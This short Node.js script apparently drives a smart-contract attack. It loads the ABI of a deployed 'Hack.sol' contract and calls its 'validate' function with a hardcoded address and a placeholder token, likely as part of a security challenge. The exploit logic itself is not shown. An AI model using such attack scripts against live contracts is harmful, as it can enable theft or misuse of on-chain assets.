const fs = require('fs')
const lib = require('../../lib')(require('../../config'))

async function main () {
    let hack_address = '...' // Hack.sol deployed address
    let hack = lib.contract(hack_address, JSON.parse(fs.readFileSync('Hack.abi')))
    await hack.call('validate', '0x84Fb598A7E8d58715d3C5F2E789570D7B5B0e290', '...') // token to emit
}

main()
